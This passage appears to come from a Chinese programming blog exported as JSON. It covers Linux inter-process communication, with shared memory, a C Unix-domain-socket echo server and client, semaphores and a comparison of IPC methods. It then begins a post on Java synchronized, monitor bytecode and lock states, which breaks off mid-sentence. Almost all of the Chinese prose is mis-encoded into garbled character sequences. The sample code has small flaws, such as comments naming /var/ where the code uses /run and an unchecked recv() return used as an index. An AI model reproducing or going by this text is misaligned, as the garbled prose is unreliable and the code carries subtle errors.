ä»€ä¹ˆæ˜¯å…±äº«å†…å­˜é¡¾åæ€ä¹‰ï¼Œå…±äº«å†…å­˜å°±æ˜¯å…è®¸ä¸¤ä¸ªä¸ç›¸å…³çš„è¿›ç¨‹è®¿é—®åŒä¸€ä¸ªé€»è¾‘å†…å­˜ï¼›å…±äº«å†…å­˜æ˜¯åœ¨ä¸¤ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¹‹é—´å…±äº«å’Œä¼ é€’æ•°æ®çš„ä¸€ç§éå¸¸æœ‰æ•ˆçš„æ–¹å¼ï¼›ä¸åŒè¿›ç¨‹ä¹‹é—´å…±äº«çš„å†…å­˜é€šå¸¸å®‰æ’ä¸ºåŒä¸€æ®µç‰©ç†å†…å­˜ï¼Œè¿›ç¨‹å¯ä»¥å°†åŒä¸€æ®µå…±äº«å†…å­˜è¿æ¥åˆ°å®ƒä»¬è‡ªå·±çš„åœ°å€ç©ºé—´ä¸­ï¼Œæ‰€æœ‰è¿›ç¨‹éƒ½å¯ä»¥è®¿é—®å…±äº«å†…å­˜ä¸­çš„åœ°å€ï¼›è€Œå¦‚æœæŸä¸ªè¿›ç¨‹å‘å…±äº«å†…å­˜å†™å…¥æ•°æ®ï¼Œæ‰€åšçš„æ”¹åŠ¨å°†ç«‹å³å½±å“åˆ°å¯ä»¥è®¿é—®åŒä¸€æ®µå…±äº«å†…å­˜çš„ä»»ä½•å…¶ä»–è¿›ç¨‹ï¼›ç‰¹åˆ«æé†’ï¼šå…±äº«å†…å­˜å¹¶æœªæä¾›åŒæ­¥æœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç¬¬ä¸€ä¸ªè¿›ç¨‹ç»“æŸå¯¹å…±äº«å†…å­˜çš„å†™æ“ä½œä¹‹å‰ï¼Œå¹¶æ— è‡ªåŠ¨æœºåˆ¶å¯ä»¥é˜»æ­¢ç¬¬äºŒä¸ªè¿›ç¨‹å¼€å§‹å¯¹å®ƒè¿›è¡Œè¯»å–ï¼›æ‰€ä»¥æˆ‘ä»¬é€šå¸¸éœ€è¦ç”¨å…¶ä»–çš„æœºåˆ¶æ¥åŒæ­¥å¯¹å…±äº«å†…å­˜çš„è®¿é—®ï¼Œä¾‹å¦‚ä¿¡å·é‡ã€äº’æ–¥é”ï¼› å…±äº«å†…å­˜çš„å‡½æ•°æ¥å£å¤´æ–‡ä»¶ï¼šsys/types.hã€sys/ipc.hã€sys/shm.hint shmget(key_t shm_key, size_t shm_size, int shm_flg);ï¼šåˆ›å»ºå…±äº«å†…å­˜shm_keyç”¨æ¥æ ‡è¯†ä¸€å—å…±äº«å†…å­˜ï¼šshm_sizeï¼šè¾“å…¥å‚æ•°ï¼Œå…±äº«å†…å­˜çš„å¤§å°ï¼ˆå•ä½ï¼šbyteï¼‰ï¼šæ³¨æ„å†…å­˜åˆ†é…çš„å•ä½æ˜¯é¡µï¼ˆä¸€èˆ¬ä¸º4kbï¼Œå¯é€šè¿‡getpagesize()è·å–ï¼‰ï¼›ä¹Ÿå°±æ˜¯è¯´å¦‚æœshm_sizeä¸º1ï¼Œé‚£ä¹ˆä¹Ÿä¼šåˆ†é…4096å­—èŠ‚çš„å†…å­˜ï¼›åªè·å–å…±äº«å†…å­˜æ—¶ï¼Œshm_sizeå¯æŒ‡å®šä¸º0ï¼› Unix domain socketsocketåŸæœ¬æ˜¯ä¸ºäº†ç½‘ç»œé€šè®¯è®¾è®¡çš„ï¼Œä½†æ˜¯åæ¥åœ¨socketçš„æ¡†æ¶ä¸Šå‘å±•å‡ºä¸€ç§IPCæœºåˆ¶ï¼Œå°±æ˜¯UNIX Domain Socketï¼›è™½ç„¶ç½‘ç»œsocketä¹Ÿå¯ç”¨äºåŒä¸€å°ä¸»æœºçš„è¿›ç¨‹é—´é€šè®¯ï¼ˆé€šè¿‡loopbackåœ°å€127.0.0.1ï¼‰ï¼Œä½†æ˜¯UNIX Domain Socketç”¨äºIPCæ›´æœ‰æ•ˆç‡ï¼š ä¸éœ€è¦ç»è¿‡ç½‘ç»œåè®®æ ˆï¼› ä¸éœ€è¦æ‰“åŒ…æ‹†åŒ…ï¼› ä¸éœ€è¦è®¡ç®—æ ¡éªŒå’Œï¼› ä¸éœ€è¦ç»´æŠ¤åºå·å’Œåº”ç­”ï¼› è¿™æ˜¯å› ä¸ºIPCæœºåˆ¶æœ¬è´¨ä¸Šæ˜¯å¯é çš„é€šè®¯ï¼Œè€Œç½‘ç»œåè®®æ˜¯ä¸ºä¸å¯é çš„é€šè®¯è®¾è®¡çš„ï¼›UNIX Domain Socketä¹Ÿæä¾›é¢å‘æµå’Œé¢å‘æ•°æ®æŠ¥ä¸¤ç§APIæ¥å£ï¼Œç±»ä¼¼TCPå’ŒUDPï¼Œä½†æ˜¯é¢å‘æ•°æ®æŠ¥çš„UNIX Domain Socketä¹Ÿæ˜¯å¯é çš„ï¼Œæ¶ˆæ¯æ—¢ä¸ä¼šä¸¢å¤±ä¹Ÿä¸ä¼šé¡ºåºé”™ä¹±ï¼›ä½¿ç”¨UNIX Domain Socketçš„è¿‡ç¨‹å’Œç½‘ç»œsocketååˆ†ç›¸ä¼¼ï¼Œä¹Ÿè¦å…ˆè°ƒç”¨socket()åˆ›å»ºä¸€ä¸ªsocketæ–‡ä»¶æè¿°ç¬¦ï¼Œaddress familyæŒ‡å®šä¸ºAF_UNIXï¼Œtypeå¯ä»¥é€‰æ‹©SOCK_STREAMæˆ–SOCK_DGRAMï¼Œprotocolå‚æ•°ä»ç„¶æŒ‡å®šä¸º0å³å¯ï¼›UNIX Domain Socketä¸ç½‘ç»œsocketç¼–ç¨‹æœ€æ˜æ˜¾çš„ä¸åŒåœ¨äºåœ°å€æ ¼å¼ä¸åŒï¼Œç”¨ç»“æ„ä½“sockaddr_unè¡¨ç¤ºï¼›ç½‘ç»œç¼–ç¨‹çš„socketåœ°å€æ˜¯IPåœ°å€åŠ ç«¯å£å·ï¼Œè€ŒUNIX Domain Socketçš„åœ°å€æ˜¯ä¸€ä¸ªsocketç±»å‹çš„æ–‡ä»¶åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„è·¯å¾„ï¼Œè¿™ä¸ªsocketæ–‡ä»¶ç”±bind()è°ƒç”¨åˆ›å»ºï¼Œå¦‚æœè°ƒç”¨bind()æ—¶è¯¥æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™bind()é”™è¯¯è¿”å›ï¼› unix_domain_server.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; #include &lt;ctype.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/un.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;netinet/in.h&gt; #include &lt;netinet/tcp.h&gt; #include &lt;netdb.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;signal.h&gt; #include &lt;sys/wait.h&gt; #define SOCK_PATH &quot;/run/echo.sock&quot; #define BUF_SIZE 1024 int listenfd; void handle_signal(int signo); int main(void){ signal(SIGINT, handle_signal); signal(SIGHUP, handle_signal); signal(SIGTERM, handle_signal); if((listenfd = socket(AF_UNIX, SOCK_STREAM, 0)) &lt; 0){ perror(&quot;socket&quot;); exit(EXIT_FAILURE); } struct sockaddr_un servaddr; memset(&amp;servaddr, 0, sizeof(servaddr)); servaddr.sun_family = AF_UNIX; strcpy(servaddr.sun_path, SOCK_PATH); unlink(SOCK_PATH); if(bind(listenfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)) &lt; 0){ //å› ä¸ºè¿™é‡Œè¦åœ¨/var/ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œè¿™ä¸ªç¨‹åºéœ€è¦sudoè¿è¡Œ perror(&quot;bind&quot;); exit(EXIT_FAILURE); } chmod(SOCK_PATH, 00640); if(listen(listenfd, SOMAXCONN) &lt; 0){ perror(&quot;listen&quot;); exit(EXIT_FAILURE); } int connfd, nbuf; char buf[BUF_SIZE + 1]; for(;;){ if((connfd = accept(listenfd, NULL, NULL)) &lt; 0){ perror(&quot;accept&quot;); continue; } nbuf = recv(connfd, buf, BUF_SIZE, 0); buf[nbuf] = 0; printf(&quot;new msg: \\&quot;%s\\&quot;\\n&quot;, buf); send(connfd, buf, nbuf, 0); close(connfd); } return 0; } void handle_signal(int signo){ if(signo == SIGINT){ fprintf(stderr, &quot;received signal: SIGINT(%d)\\n&quot;, signo); }else if(signo == SIGHUP){ fprintf(stderr, &quot;received signal: SIGHUP(%d)\\n&quot;, signo); }else if(signo == SIGTERM){ fprintf(stderr, &quot;received signal: SIGTERM(%d)\\n&quot;, signo); } close(listenfd); unlink(SOCK_PATH); exit(EXIT_SUCCESS); } unix_domain_client.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; #include &lt;ctype.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/un.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;netinet/in.h&gt; #include &lt;netinet/tcp.h&gt; #include &lt;netdb.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/ioctl.h&gt; #include &lt;signal.h&gt; #include &lt;sys/wait.h&gt; #define SOCK_PATH &quot;/run/echo.sock&quot; #define BUF_SIZE 1024 int main(int argc, char *argv[]){ if(argc &lt; 2){ fprintf(stderr, &quot;usage: %s msg\\n&quot;, argv[0]); exit(EXIT_FAILURE); } int sockfd; if((sockfd = socket(AF_UNIX, SOCK_STREAM, 0)) &lt; 0){ perror(&quot;socket&quot;); exit(EXIT_FAILURE); } struct sockaddr_un servaddr; memset(&amp;servaddr, 0, sizeof(servaddr)); servaddr.sun_family = AF_UNIX; strcpy(servaddr.sun_path, SOCK_PATH); if(connect(sockfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)) &lt; 0){ perror(&quot;connect&quot;); exit(EXIT_FAILURE); } char buf[BUF_SIZE + 1]; int nbuf; nbuf = strlen(argv[1]); send(sockfd, argv[1], nbuf, 0); nbuf = recv(sockfd, buf, BUF_SIZE, 0); buf[nbuf] = 0; printf(&quot;echo msg: \\&quot;%s\\&quot;\\n&quot;, buf); close(sockfd); return 0; } ä¸Šè¿°ç¨‹åºå®ç°äº†é€šè¿‡uninx domain socketçš„client-server æ•°æ®ä¼ è¾“ï¼Œå°±åƒæ˜¯é€šè¿‡/var/echo.sockè¿™ä¸ªæ–‡ä»¶ä¼ è¾“æ•°æ®ã€‚å°è±¡ä¸­uwsiä¹Ÿæ˜¯è¿™æ ·å®ç°nginxå’Œdjangoè¿›ç¨‹çš„é€šä¿¡ã€‚ ä¿¡å·é‡ä¿¡å·é‡æ˜¯ç”¨æ¥è°ƒåè¿›ç¨‹å¯¹å…±äº«èµ„æºçš„è®¿é—®çš„ï¼Œç¨‹åºå¯¹ä¿¡å·é‡çš„æ“ä½œéƒ½æ˜¯åŸå­æ“ä½œï¼Œå¹¶ä¸”åªèƒ½å¯¹å®ƒè¿›è¡Œç­‰å¾…å’Œå‘é€æ“ä½œã€‚å½“è¯·æ±‚ä¸€ä¸ªä½¿ç”¨ä¿¡å·é‡æ¥è¡¨ç¤ºçš„èµ„æºæ—¶ï¼Œè¿›ç¨‹éœ€è¦å…ˆè¯»å–ä¿¡å·é‡çš„å€¼æ¥åˆ¤æ–­èµ„æºæ˜¯å¦å¯ç”¨ã€‚å¤§äº0ï¼Œèµ„æºå¯ä»¥è¯·æ±‚ï¼Œç­‰äº0ï¼Œæ— èµ„æºå¯ç”¨ï¼Œè¿›ç¨‹ä¼šè¿›å…¥ç¡çœ çŠ¶æ€ç›´è‡³èµ„æºå¯ç”¨ã€‚å½“è¿›ç¨‹ä¸å†ä½¿ç”¨ä¸€ä¸ªä¿¡å·é‡æ§åˆ¶çš„å…±äº«èµ„æºæ—¶ï¼Œä¿¡å·é‡çš„å€¼+1ï¼Œå¯¹ä¿¡å·é‡çš„å€¼è¿›è¡Œçš„å¢å‡æ“ä½œå‡ä¸ºåŸå­æ“ä½œï¼Œè¿™æ˜¯ç”±äºä¿¡å·é‡ä¸»è¦çš„ä½œç”¨æ˜¯ç»´æŠ¤èµ„æºçš„äº’æ–¥æˆ–å¤šè¿›ç¨‹çš„åŒæ­¥è®¿é—®ã€‚è€Œåœ¨ä¿¡å·é‡çš„åˆ›å»ºåŠåˆå§‹åŒ–ä¸Šï¼Œä¸èƒ½ä¿è¯æ“ä½œå‡ä¸ºåŸå­æ€§ã€‚ æ€»ç»“ç°åœ¨æŠŠè¿›ç¨‹ä¹‹é—´ä¼ é€’ä¿¡æ¯çš„å„ç§é€”å¾„ï¼ˆåŒ…æ‹¬å„ç§IPCæœºåˆ¶ï¼‰æ€»ç»“å¦‚ä¸‹ï¼šçˆ¶è¿›ç¨‹é€šè¿‡forkå¯ä»¥å°†æ‰“å¼€æ–‡ä»¶çš„æè¿°ç¬¦ä¼ é€’ç»™å­è¿›ç¨‹å­è¿›ç¨‹ç»“æŸæ—¶ï¼Œçˆ¶è¿›ç¨‹è°ƒç”¨waitå¯ä»¥å¾—åˆ°å­è¿›ç¨‹çš„ç»ˆæ­¢ä¿¡æ¯å‡ ä¸ªè¿›ç¨‹å¯ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­è¯»å†™æŸä¸ªå…±äº«æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç»™æ–‡ä»¶åŠ é”æ¥å®ç°è¿›ç¨‹é—´åŒæ­¥è¿›ç¨‹ä¹‹é—´äº’å‘ä¿¡å·ï¼Œä¸€èˆ¬ä½¿ç”¨SIGUSR1å’ŒSIGUSR2å®ç°ç”¨æˆ·è‡ªå®šä¹‰åŠŸèƒ½ç®¡é“FIFOmmapå‡½æ•°ï¼Œå‡ ä¸ªè¿›ç¨‹å¯ä»¥æ˜ å°„åŒä¸€å†…å­˜åŒºSYS V IPCï¼Œä»¥å‰çš„SYS V UNIXç³»ç»Ÿå®ç°çš„IPCæœºåˆ¶ï¼ŒåŒ…æ‹¬æ¶ˆæ¯é˜Ÿåˆ—ã€ä¿¡å·é‡å’Œå…±äº«å†…å­˜ï¼Œç°åœ¨å·²ç»åŸºæœ¬åºŸå¼ƒLinuxå†…æ ¸ç»§æ‰¿å’Œå…¼å®¹äº†ä¸°å¯Œçš„Unixç³»ç»Ÿè¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰æœºåˆ¶ã€‚æœ‰ä¼ ç»Ÿçš„ç®¡é“ï¼ˆPipeï¼‰ã€ä¿¡å·ï¼ˆSignalï¼‰å’Œè·Ÿè¸ªï¼ˆTraceï¼‰ï¼Œè¿™ä¸‰é¡¹é€šä¿¡æ‰‹æ®µåªèƒ½ç”¨äºçˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ä¹‹é—´ï¼Œæˆ–è€…å…„å¼Ÿè¿›ç¨‹ä¹‹é—´ï¼›åæ¥åˆå¢åŠ äº†å‘½ä»¤ç®¡é“ï¼ˆNamed Pipeï¼‰ï¼Œä½¿å¾—è¿›ç¨‹é—´é€šä¿¡ä¸å†å±€é™äºçˆ¶å­è¿›ç¨‹æˆ–è€…å…„å¼Ÿè¿›ç¨‹ä¹‹é—´ï¼›ä¸ºäº†æ›´å¥½åœ°æ”¯æŒå•†ä¸šåº”ç”¨ä¸­çš„äº‹åŠ¡å¤„ç†ï¼Œåœ¨AT&amp;Tçš„Unixç³»ç»ŸVä¸­ï¼Œåˆå¢åŠ äº†ä¸‰ç§ç§°ä¸ºâ€œSystem V IPCâ€çš„è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼Œåˆ†åˆ«æ˜¯æŠ¥æ–‡é˜Ÿåˆ—ï¼ˆMessageï¼‰ã€å…±äº«å†…å­˜ï¼ˆShare Memoryï¼‰å’Œä¿¡å·é‡ï¼ˆSemaphoreï¼‰ï¼›åæ¥BSD Unixå¯¹â€œSystem V IPCâ€æœºåˆ¶è¿›è¡Œäº†é‡è¦çš„æ‰©å……ï¼Œæä¾›äº†ä¸€ç§ç§°ä¸ºæ’å£ï¼ˆSocketï¼‰çš„è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ã€‚UNIX Domain Socketæ˜¯ç›®å‰æœ€å¹¿æ³›ä½¿ç”¨çš„IPCæœºåˆ¶ Linuxç°æœ‰çš„æ‰€æœ‰è¿›ç¨‹é—´IPCæ–¹å¼ ç®¡é“ï¼šåœ¨åˆ›å»ºæ—¶åˆ†é…ä¸€ä¸ªpageå¤§å°çš„å†…å­˜ï¼Œç¼“å­˜åŒºå¤§å°æ¯”è¾ƒæœ‰é™ï¼› æ¶ˆæ¯é˜Ÿåˆ—ï¼šä¿¡æ¯å¤åˆ¶ä¸¤æ¬¡ï¼Œé¢å¤–çš„CPUæ¶ˆè€—ï¼›ä¸åˆé€‚é¢‘ç¹æˆ–ä¿¡æ¯é‡å¤§çš„é€šä¿¡ï¼› å…±äº«å†…å­˜ï¼šæ— é¡»å¤åˆ¶ï¼Œå…±äº«ç¼“å†²åŒºç›´æ¥ä»˜é™„åŠ åˆ°è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œé€Ÿåº¦å¿«ï¼›ä½†è¿›ç¨‹é—´çš„åŒæ­¥é—®é¢˜æ“ä½œç³»ç»Ÿæ— æ³•å®ç°ï¼Œå¿…é¡»å„è¿›ç¨‹åˆ©ç”¨åŒæ­¥å·¥å…·è§£å†³ï¼› å¥—æ¥å­—ï¼šä½œä¸ºæ›´é€šç”¨çš„æ¥å£ï¼Œä¼ è¾“æ•ˆç‡ä½ï¼Œä¸»è¦ç”¨äºä¸é€šæœºå™¨æˆ–è·¨ç½‘ç»œçš„é€šä¿¡ï¼› ä¿¡å·é‡ï¼šå¸¸ä½œä¸ºä¸€ç§é”æœºåˆ¶ï¼Œé˜²æ­¢æŸè¿›ç¨‹æ­£åœ¨è®¿é—®å…±äº«èµ„æºæ—¶ï¼Œå…¶ä»–è¿›ç¨‹ä¹Ÿè®¿é—®è¯¥èµ„æºã€‚å› æ­¤ï¼Œä¸»è¦ä½œä¸ºè¿›ç¨‹é—´ä»¥åŠåŒä¸€è¿›ç¨‹å†…ä¸åŒçº¿ç¨‹ä¹‹é—´çš„åŒæ­¥æ‰‹æ®µã€‚ ä¿¡å·: ä¸é€‚ç”¨äºä¿¡æ¯äº¤æ¢ï¼Œæ›´é€‚ç”¨äºè¿›ç¨‹ä¸­æ–­æ§åˆ¶ï¼Œæ¯”å¦‚éæ³•å†…å­˜è®¿é—®ï¼Œæ€æ­»æŸä¸ªè¿›ç¨‹ç­‰ï¼› å‚è€ƒcè¯­è¨€å¤šè¿›ç¨‹ç¼–ç¨‹","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"c","slug":"c","permalink":"https://haldir65.github.io/tags/c/"}]},{"title":"ç¼–ç¨‹è¯­è¨€ä¸­ä½¿ç”¨åˆ°çš„å¤šçº¿ç¨‹åŸºç¡€æ•°æ®ç»“æ„","date":"2019-01-30T07:53:33.000Z","path":"2019/01/30/2019-01-30-concurrency-primitives-in-programing-languages/","text":"ä¸»è¦è®²è®²javaä¸­çš„notify,wait,synchronized ï¼Œunsafeç­‰å¤šçº¿ç¨‹åŸºç¡€å·¥å…·çš„ä½¿ç”¨æ–¹å¼ã€‚ javawaitå’Œnotifyæœ‰ä¸€ä¸ªå¼‚å¸¸å«åšjava.lang.IllegalMonitorStateExceptionã€‚æ„æ€å°±æ˜¯æ²¡æœ‰åœ¨synchronized blockä¸­è°ƒç”¨waitæˆ–è€…notifyæ–¹æ³•ã€‚java Objectä¸­æ˜¯æœ‰ä¸€ä¸ªmonitorå¯¹è±¡çš„ï¼Œwaitå’Œnotifyå°±æ˜¯åŸºäºè¿™ä¸ªå±æ€§å»å®ç°çš„ã€‚åªè¦åœ¨åŒä¸€å¯¹è±¡ä¸Šå»è°ƒç”¨notify/notifyAllæ–¹æ³•ï¼Œå°±å¯ä»¥å”¤é†’å¯¹åº”å¯¹è±¡monitorä¸Šç­‰å¾…çš„çº¿ç¨‹äº†ã€‚ä¸ºä»€ä¹ˆjvméœ€è¦å¯¹è±¡çš„å¤´éƒ¨ä¿¡æ¯å‘¢ï¼Œä¸€æ˜¯ç»™GCï¼Œé”åšæ ‡è®°ï¼ŒäºŒæ˜¯hashæ•°æ®å’Œåˆ†ä»£å¹´é¾„ï¼Œä¸‰æ˜¯ä¸ºäº†ä»å¯¹è±¡æŒ‡é’ˆå°±å¯ä»¥ä¼šçš„å…¶æ•°æ®ç±»å‹åŠåŠ¨æ€åˆ†æ´¾çš„èƒ½åŠ›ï¼Œå››æ˜¯æ•°ç»„ç±»å‹éœ€è¦æœ‰æ•°é‡ä¿¡æ¯ã€‚ æŠ›å‡ºå¼‚å¸¸ä¹Ÿéœ€è¦è·å¾—é”waitæ–¹æ³•æŠ›å‡ºäº†InterruptedExceptionå¼‚å¸¸ï¼Œå³ä½¿æ˜¯å¼‚å¸¸ï¼Œä¹Ÿæ˜¯è¦è·å–åˆ°ç›‘è§†å™¨é”äº†æ‰ä¼šæŠ›å‡º synchronizedå…³é”®å­—ä»è¯­æ³•ä¸Šè®²ï¼Œsynchronizedå¯ä»¥ç”¨åœ¨instance method(é”åœ¨è¿™ä¸ªinstanceä¸Š), static method (é”åœ¨è¿™ä¸ªclass )ä»¥åŠmethod block(é”è¿™ä¸€å—ä»£ç é€»è¾‘)ã€‚âœ $ cat SynchronizedSample.java package com.me.harris.concurrent; public class SynchronizedSample { public void method() { synchronized (this) { System.out.println(&quot;Method 1 start&quot;); } } } javac SynchronizedSample.javajavap -c SynchronizedSample Warning: Binary file SynchronizedSample contains com.me.harris.concurrent.SynchronizedSample Compiled from &quot;SynchronizedSample.java&quot; public class com.me.harris.concurrent.SynchronizedSample { public com.me.harris.concurrent.SynchronizedSample(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public void method(); Code: 0: aload_0 1: dup 2: astore_1 3: monitorenter ///çœ‹è¿™é‡Œ 4: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 7: ldc #3 // String Method 1 start 9: invokevirtual #4 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 12: aload_1 13: monitorexit //çœ‹è¿™é‡Œ 14: goto 22 17: astore_2 18: aload_1 19: monitorexit 20: aload_2 21: athrow 22: return Exception table: from to target type 4 14 17 any 17 20 17 any } java docæ˜¯è¿™ä¹ˆè§£é‡Šçš„ Each object is associated with a monitor. A monitor is locked if and only if it has an owner. The thread that executes monitorenter attempts to gain ownership of the monitor associated with objectref, as follows:â€¢ If the entry count of the monitor associated with objectref is zero, the thread enters the monitor and sets its entry count to one. The thread is then the owner of the monitor.â€¢ If the thread already owns the monitor associated with objectref, it reenters the monitor, incrementing its entry count.â€¢ If another thread already owns the monitor associated with objectref, the thread blocks until the monitorâ€™s entry count is zero, then tries again to gain ownership.çœ‹ä¸Šå»å¾ˆåƒcè¯­è¨€é‡Œé¢çš„semctlå˜›ã€‚Synchronizedæ˜¯é€šè¿‡å¯¹è±¡å†…éƒ¨çš„ä¸€ä¸ªå«åšç›‘è§†å™¨é”ï¼ˆmonitorï¼‰æ¥å®ç°çš„ï¼Œmonitorå¯¹è±¡å­˜åœ¨äºæ¯ä¸€ä¸ªjavaå¯¹è±¡çš„å¯¹è±¡å¤´ä¸­(å…·ä½“ç‚¹æ˜¯å­˜çš„æ˜¯æŒ‡é’ˆ)ã€‚ä½†æ˜¯ç›‘è§†å™¨é”æœ¬è´¨åˆæ˜¯ä¾èµ–äºåº•å±‚çš„æ“ä½œç³»ç»Ÿçš„Mutex Lockæ¥å®ç°çš„ã€‚è€Œæ“ä½œç³»ç»Ÿå®ç°çº¿ç¨‹ä¹‹é—´çš„åˆ‡æ¢è¿™å°±éœ€è¦ä»ç”¨æˆ·æ€è½¬æ¢åˆ°æ ¸å¿ƒæ€ï¼Œè¿™ä¸ªæˆæœ¬éå¸¸é«˜ï¼ŒçŠ¶æ€ä¹‹é—´çš„è½¬æ¢éœ€è¦ç›¸å¯¹æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆSynchronizedæ•ˆç‡ä½çš„åŸå› ã€‚å› æ­¤ï¼Œè¿™ç§ä¾èµ–äºæ“ä½œç³»ç»ŸMutex Lockæ‰€å®ç°çš„é”æˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œé‡é‡çº§é”â€ã€‚JDKä¸­å¯¹Synchronizedåšçš„ç§ç§ä¼˜åŒ–ï¼Œå…¶æ ¸å¿ƒéƒ½æ˜¯ä¸ºäº†å‡å°‘è¿™ç§é‡é‡çº§é”çš„ä½¿ç”¨ã€‚JDK1.6ä»¥åï¼Œä¸ºäº†å‡å°‘è·å¾—é”å’Œé‡Šæ”¾é”æ‰€å¸¦æ¥çš„æ€§èƒ½æ¶ˆè€—ï¼Œæé«˜æ€§èƒ½ï¼Œå¼•å…¥äº†â€œè½»é‡çº§é”â€å’Œâ€œåå‘é”â€ã€‚ Javaè™šæ‹Ÿæœºå¯¹synchronizedçš„ä¼˜åŒ–é”çš„çŠ¶æ€æ€»å…±æœ‰å››ç§ï¼Œæ— é”çŠ¶æ€ã€åå‘é”ã€è½»é‡çº§é”å’Œé‡é‡çº§é”ã€‚éšç€é”çš„ç«äº‰ï¼Œé”å¯ä»¥ä»åå‘é”å‡çº§åˆ°è½»é‡çº§é”ï¼Œå†å‡çº§çš„é‡é‡çº§é”ï¼Œä½†æ˜¯é”çš„å‡çº§æ˜¯å•å‘çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½ä»ä½åˆ°é«˜å‡çº§ï¼Œä¸ä¼šå‡ºç°é”çš„é™çº§ é”çš„å®ç°javaä¸­çš„é”ä¸€å…±æœ‰4ç§çŠ¶æ€ï¼Œçº§åˆ«ä»ä½åˆ°é«˜åˆ†åˆ«æ˜¯ï¼š æ— é”çŠ¶æ€ åå‘é” è½»é‡çº§é” é‡é‡çº§é” åå‘é”ï¼šé¡¾åæ€ä¹‰ï¼Œä¸ºäº†è®©çº¿ç¨‹è·å¾—é”çš„ä»£ä»·æ›´ä½ï¼Œå¼•å…¥äº†åå‘é”ã€‚åŠ é”å½“ä¸€ä¸ªçº¿ç¨‹è®¿é—®åŒæ­¥å—å¹¶ä¸”è·å–é”æ—¶ï¼Œä¼šåœ¨å¯¹è±¡å¤´å’Œæ ˆå¸§ä¸­çš„é”è®°å½•é‡Œå­˜å‚¨é”åå‘çš„çº¿ç¨‹idï¼Œè¿™æ ·ï¼Œè¿™ä¸ªçº¿ç¨‹ä¾¿è·å–äº†è¿™ä¸ªå¯¹è±¡çš„åå‘é”ï¼Œä¹‹åè¿™ä¸ªçº¿ç¨‹è¿›å…¥å’Œé€€å‡ºå°±ä¸éœ€è¦é€šè¿‡CASæ“ä½œï¼Œä¹Ÿå°±æ˜¯åŸå­æ“ä½œï¼Œæ¥è¿›è¡ŒåŠ é”å’Œè§£é”ï¼Œåªéœ€è¦ç®€å•çš„æµ‹è¯•ä¸‹å¯¹è±¡å¤´å­˜å‚¨çš„åå‘é”çš„çº¿ç¨‹idæ˜¯å¦å’Œè‡ªèº«çš„idä¸€è‡´ï¼Œå¦‚æœä¸€è‡´ï¼Œé‚£ä¹ˆå·²ç»è·å–é”ï¼Œç›´æ¥è¿›å…¥ã€‚å¦åˆ™ï¼Œåˆ¤æ–­å¯¹è±¡ä¸­æ˜¯å¦å·²ç»å­˜å‚¨äº†åå‘é”ï¼Œå¦‚æœæ²¡æœ‰é”ï¼Œé‚£ä¹ˆä½¿ç”¨CASç«äº‰é”ï¼Œå¦‚æœè®¾ç½®äº†ï¼Œé‚£ä¹ˆå°è¯•ä½¿ç”¨CASå°†å¯¹è±¡å¤´çš„åå‘é”æŒ‡å‘å½“å‰çº¿ç¨‹ã€‚è§£é”åå‘é”çš„è§£é”æ—¶æœºæ˜¯åœ¨ç«äº‰æ—¶æ‰ä¼šé‡Šæ”¾é”,æ’¤é”€æ—¶éœ€è¦ç­‰å¾…å…¨å±€å®‰å…¨ç‚¹ï¼Œè¿™ä¸ªæ—¶é—´ç‚¹æ²¡æœ‰æ­£åœ¨æ‰§è¡Œçš„å­—èŠ‚ç ï¼Œé¦–å…ˆä¼šæš‚åœæ‹¥æœ‰åå‘é”çš„çº¿ç¨‹ï¼Œç„¶åæ£€æŸ¥åå‘é”çš„çº¿ç¨‹æ˜¯å¦å­˜æ´»ï¼Œå¦‚æœä¸æ´»åŠ¨ï¼Œé‚£ä¹ˆç›´æ¥è®¾ç½®ä¸ºæ— é”çŠ¶æ€ã€‚å¦åˆ™è¦ä¹ˆåå‘å…¶ä»–é”ï¼Œè¦ä¹ˆæ¢å¤åˆ°æ— é”æˆ–è€…æ ‡è®°å¯¹è±¡ä¸é€‚åˆåå‘é”ã€‚ è½»é‡é”ä¼šè‡ªæ—‹å°è¯•è·å–é”ï¼Œæ¶ˆè€—cpuèµ„æºåŠ é”ä¸€æ—¦å¤šçº¿ç¨‹å‘èµ·äº†é”ç«äº‰ï¼Œå¹¶ä¸”é‡Šæ”¾äº†åå‘é”ä¹‹åï¼Œçº¿ç¨‹é€šè¿‡CASä¿®æ”¹Mark 